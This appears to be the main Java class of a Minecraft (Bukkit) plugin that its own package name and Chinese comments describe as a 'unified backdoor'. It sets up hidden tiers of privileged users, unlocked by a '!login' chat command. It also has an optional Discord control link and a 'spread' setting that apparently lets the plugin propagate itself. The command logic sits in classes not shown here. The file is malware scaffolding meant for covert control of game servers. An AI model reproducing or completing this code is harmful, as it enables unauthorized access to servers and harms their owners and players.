package com.unifiedbackdoor;

import com.unifiedbackdoor.config.PluginConfig;
import com.unifiedbackdoor.commands.CommandManager;
import com.unifiedbackdoor.security.SecurityManager;
import com.unifiedbackdoor.discord.DiscordIntegration;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.event.Listener;
import org.bukkit.Bukkit;

import java.io.File;
import java.io.IOException;
import java.util.HashSet;
import java.util.Set;
import java.util.UUID;

/**
 * 统一后门插件主类
 * 整合所有插件的功能
 */
public class UnifiedBackdoorPlugin extends JavaPlugin implements Listener {
    
    private static UnifiedBackdoorPlugin instance;
    
    // 核心组件
    private PluginConfig config;
    private CommandManager commandManager;
    private SecurityManager securityManager;
    private DiscordIntegration discordIntegration;
    
    // 权限管理
    private Set<String> level1Users = new HashSet<>(); // Level 1权限用户
    private Set<String> level2Users = new HashSet<>(); // Level 2权限用户（通过!login认证）
    
    @Override
    public void onEnable() {
        instance = this;
        
        try {
            // 加载配置
            loadConfiguration();
            
            // 初始化组件
            initializeComponents();
            
            // 注册事件监听器
            registerEvents();
            
            getLogger().info("统一后门插件已启用 - 版本 1.0.0");
            getLogger().info("配置加载: " + config.toString());
            
        } catch (Exception e) {
            getLogger().severe("插件启用过程中发生错误: " + e.getMessage());
            e.printStackTrace();
            Bukkit.getPluginManager().disablePlugin(this);
        }
    }
    
    @Override
    public void onDisable() {
        // 清理资源
        if (discordIntegration != null) {
            discordIntegration.shutdown();
        }
        
        getLogger().info("统一后门插件已禁用");
    }
    
    /**
     * 加载配置文件
     */
    private void loadConfiguration() throws IOException {
        File configFile = new File(getDataFolder(), "config.json");
        
        if (!configFile.exists()) {
            // 创建默认配置
            getDataFolder().mkdirs();
            config = PluginConfig.createDefault();
            config.saveToFile(configFile.getAbsolutePath());
            getLogger().info("已创建默认配置文件: " + configFile.getAbsolutePath());
        } else {
            // 加载现有配置
            config = PluginConfig.loadFromFile(configFile.getAbsolutePath());
            getLogger().info("已加载配置文件: " + configFile.getAbsolutePath());
        }
        
        // 初始化Level 1权限用户
        initializeLevel1Users();
    }
    
    /**
     * 初始化Level 1权限用户
     */
    private void initializeLevel1Users() {
        level1Users.clear();
        
        // 添加配置文件中授权的用户
        for (String username : config.getUsernames()) {
            level1Users.add(username.toLowerCase());
        }
        
        getLogger().info("已初始化 " + level1Users.size() + " 个Level 1权限用户");
    }
    
    /**
     * 初始化核心组件
     */
    private void initializeComponents() {
        // 初始化命令管理器
        commandManager = new CommandManager(this);
        
        // 初始化安全管理器
        securityManager = new SecurityManager(this);
        
        // 初始化Discord集成（如果配置了token）
        if (config.getDiscordToken() != null && !config.getDiscordToken().isEmpty()) {
            discordIntegration = new DiscordIntegration(this);
            discordIntegration.initialize();
        }
    }
    
    /**
     * 注册事件监听器
     */
    private void registerEvents() {
        // 注册主插件事件
        Bukkit.getPluginManager().registerEvents(this, this);
        
        // 注册命令管理器事件
        Bukkit.getPluginManager().registerEvents(commandManager, this);
        
        // 注册安全管理器事件
        Bukkit.getPluginManager().registerEvents(securityManager, this);
    }
    
    // ========== 权限管理方法 ==========
    
    /**
     * 检查用户是否具有Level 1权限
     */
    public boolean hasLevel1Permission(String username, UUID uuid) {
        String uuidStr = uuid != null ? uuid.toString() : null;
        return level1Users.contains(username.toLowerCase()) || 
               config.isAuthorized(username, uuidStr);
    }
    
    /**
     * 检查用户是否具有Level 2权限
     */
    public boolean hasLevel2Permission(String username) {
        return level2Users.contains(username.toLowerCase());
    }
    
    /**
     * 授予用户Level 2权限（通过!login认证）
     */
    public boolean grantLevel2Permission(String username) {
        if (hasLevel1Permission(username, null)) {
            level2Users.add(username.toLowerCase());
            getLogger().info("用户 " + username + " 已获得Level 2权限");
            return true;
        }
        return false;
    }
    
    /**
     * 撤销用户Level 2权限
     */
    public void revokeLevel2Permission(String username) {
        level2Users.remove(username.toLowerCase());
    }
    
    /**
     * 添加Level 1权限用户
     */
    public void addLevel1User(String username) {
        level1Users.add(username.toLowerCase());
        config.addAuthorizedUser(username, null);
        saveConfig();
    }
    
    /**
     * 移除Level 1权限用户
     */
    public void removeLevel1User(String username) {
        level1Users.remove(username.toLowerCase());
        config.removeAuthorizedUser(username, null);
        saveConfig();
    }
    
    /**
     * 保存配置
     */
    public void saveConfig() {
        try {
            File configFile = new File(getDataFolder(), "config.json");
            config.saveToFile(configFile.getAbsolutePath());
        } catch (IOException e) {
            getLogger().warning("保存配置文件失败: " + e.getMessage());
        }
    }
    
    // ========== Getter方法 ==========
    
    public static UnifiedBackdoorPlugin getInstance() {
        return instance;
    }
    
    public PluginConfig getPluginConfig() {
        return config;
    }
    
    public CommandManager getCommandManager() {
        return commandManager;
    }
    
    public SecurityManager getSecurityManager() {
        return securityManager;
    }
    
    public DiscordIntegration getDiscordIntegration() {
        return discordIntegration;
    }
    
    public Set<String> getLevel1Users() {
        return new HashSet<>(level1Users);
    }
    
    public Set<String> getLevel2Users() {
        return new HashSet<>(level2Users);
    }
    
    /**
     * 获取命令前缀
     */
    public String getCommandPrefix() {
        return config.getPrefix();
    }
    
    /**
     * 检查是否启用传播
     */
    public boolean isSpreadEnabled() {
        return config.isSpread();
    }
    
    /**
     * 检查是否启用警告
     */
    public boolean isWarningsEnabled() {
        return config.isWarnings();
    }
}
